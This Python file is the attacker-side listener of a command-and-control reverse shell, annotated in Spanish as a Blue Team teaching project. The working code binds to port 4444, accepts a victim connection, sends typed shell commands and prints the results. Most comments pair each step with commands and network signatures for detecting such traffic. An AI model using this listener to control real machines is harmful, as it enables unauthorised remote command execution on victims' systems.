#!/usr/bin/env python3
# =============================================================================
# C2 SERVER - LADO DEL ATACANTE (Command & Control)
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# =============================================================================

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ IMPORTACIÓN DE LIBRERÍAS                                                │
# └─────────────────────────────────────────────────────────────────────────┘
import socket

    # socket     → Comunicaciones de red (crear sockets, enviar/recibir datos)

    # 🛡️ DETECCIÓN: EDRs monitorean este import como posible C2
    # 🛡️ MANJARO: sudo journalctl | grep -i "python"

class Listener:
    def __init__(self, ip, port):
        # ┌─────────────────────────────────────────────────────────────────────────┐
        # │ CREACIÓN DEL SOCKET                                                     │
        # └─────────────────────────────────────────────────────────────────────────┘
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # socket.socket() → Crea un endpoint de comunicación de red
            # AF_INET         → Familia de direcciones IPv4 (ej: 192.168.1.39)
            # SOCK_STREAM     → Protocolo TCP (orientado a conexión, confiable)

            # 🛡️ DETECCIÓN: Esta combinación (TCP + IPv4) es común en malware C2
            # 🛡️ COMANDO MANJARO: sudo lsof -i -P -n | grep python
        # ┌─────────────────────────────────────────────────────────────────────────┐
        # │ CONFIGURACIÓN DE OPCIONES DEL SOCKET                                    │
        # └─────────────────────────────────────────────────────────────────────────┘
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # setsockopt()       → Configura opciones avanzadas del socket
            # SOL_SOCKET         → Nivel de configuración (opciones generales)
            # SO_REUSEADDR       → Permite reutilizar el puerto inmediatamente
            # 1                  → Valor booleano (True) para activar

            # 🛡️ DETECCIÓN: Esta opción es común en servidores legítimos y malware
        # ┌─────────────────────────────────────────────────────────────────────────┐
        # │ ENLACE DEL PUERTO (BIND) - PUNTO DE DETECCIÓN #1 ⚠️                     │
        # └─────────────────────────────────────────────────────────────────────────┘
        listener.bind((ip, port))
            # bind()            → Asocia el socket a una IP y puerto específicos
            # 192.168.1.39      → IP de la interfaz de red donde escuchar
            # 4444              → Número de puerto para conexiones entrantes

            # 🛡️ DETECCIÓN #1: Puerto 4444 en estado LISTEN
            # 🛡️ COMANDO MANJARO: sudo ss -tlnp | grep 4444
        # ┌─────────────────────────────────────────────────────────────────────────┐
        # │ INICIAR ESCUCHA (LISTEN)                                                │
        # └─────────────────────────────────────────────────────────────────────────┘
        listener.listen(0)

            # listen()    → Habilita el socket para aceptar conexiones entrantes
            # 0           → Número máximo de conexiones en cola (BACKLOG)

            # 🛡️ DETECCIÓN: Socket cambia de estado a LISTEN
            # 🛡️ COMANDO MANJARO: sudo ss -tlnp | grep python
        # ┌─────────────────────────────────────────────────────────────────────────┐
        # │ MENSAJE DE ESTADO - HUELLA FORENSE #1                                   │
        # └─────────────────────────────────────────────────────────────────────────┘
        print("[+] Esperando Conexiones")

            # print() → Muestra mensaje en la consola/terminal del atacante

            # 🛡️ DETECCIÓN: Evidencia forense si se captura la terminal
        # ┌─────────────────────────────────────────────────────────────────────────┐
        # │ ACEPTAR CONEXIÓN - PUNTO DE DETECCIÓN #2 ⚠️                             │
        # └─────────────────────────────────────────────────────────────────────────┘
        self.connection, address = listener.accept()
            # accept()  → Bloquea hasta que una víctima se conecta
            # connection → Nuevo socket para comunicación con la víctima
            # address    → Tupla con (IP, Puerto) de la víctima

            # 🛡️ DETECCIÓN #2: Conexión ESTABLISHED desde víctima hacia 4444
            # 🛡️ COMANDO MANJARO: sudo netstat -antp | grep 4444
        # ┌─────────────────────────────────────────────────────────────────────────┐
        # │ CONFIRMACIÓN DE CONEXIÓN - HUELLA FORENSE #2                            │
        # └─────────────────────────────────────────────────────────────────────────┘
        print("[+] Tenemos una conexion de " + str(address))
            # print() → Muestra información de la víctima comprometida

            # 🛡️ DETECCIÓN: La IP de la víctima queda registrada en consola
    
    def ejecutarRemoto(self,command):
        # ┌─────────────────────────────────────────────────────────────────────┐
        # │ ENVÍO DE COMANDO A LA VÍCTIMA - PUNTO DE DETECCIÓN #3 ⚠️            │
        # └─────────────────────────────────────────────────────────────────────┘
        self.connection.send(command.encode('utf-8'))
            # send()          → Envía datos a través del túnel TCP
            # encode('utf-8') → Convierte STRING a BYTES (requerido en Python 3)
            
            # 🛡️ DETECCIÓN #3: Comandos en TEXTO PLANO visibles en red
            # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -X
        return self.connection.recv(1024)

    def run(self):
        # ┌─────────────────────────────────────────────────────────────────────────┐
        # │ BUCLE PRINCIPAL - CONTROL REMOTO ACTIVO                                 │
        # └─────────────────────────────────────────────────────────────────────────┘
        while True: # 🛡️ DETECCIÓN: Conexión TCP de LARGA DURACIÓN (> 5 minutos) 
            # ┌─────────────────────────────────────────────────────────────────────┐
            # │ ENTRADA DE COMANDOS - HUELLA FORENSE #3                             │
            # └─────────────────────────────────────────────────────────────────────┘
            command = input("shell »» " )
                # input()     → El atacante escribe comandos manualmente
                # shell»»     → Prompt personalizado (firma detectable)
                #
                # 🛡️ DETECCIÓN: Prompt "shell»»" es firma única en logs de terminal
            # ┌─────────────────────────────────────────────────────────────────────┐
            # │ RECEPCIÓN DE RESULTADOS - EXFILTRACIÓN DE DATOS ⚠️                  │
            # └─────────────────────────────────────────────────────────────────────┘
            result = self.ejecutarRemoto(command)
                # recv(1024) → Recibe hasta 1024 bytes de datos de la víctima
                
                # 🛡️ DETECCIÓN #4: Datos salientes desde víctima en puerto 4444
                # 🛡️ COMANDO MANJARO: sudo tcpdump -i any port 4444 -w c2.pcap
            # ┌─────────────────────────────────────────────────────────────────────┐
            # │ MOSTRAR RESULTADOS - HUELLA FORENSE #4                              │
            # └─────────────────────────────────────────────────────────────────────┘
            print(result.decode('utf-8', errors='ignore'))
                # print()           → Muestra resultados en consola del atacante
                # decode('utf-8')   → Convierte BYTES a STRING legible
                # errors='ignore'   → Ignora caracteres inválidos (evita crashes)
                
                # 🛡️ DETECCIÓN: Evidencia forense de qué información fue comprometida

escuchar=Listener("192.168.1.39",4444)
escuchar.run()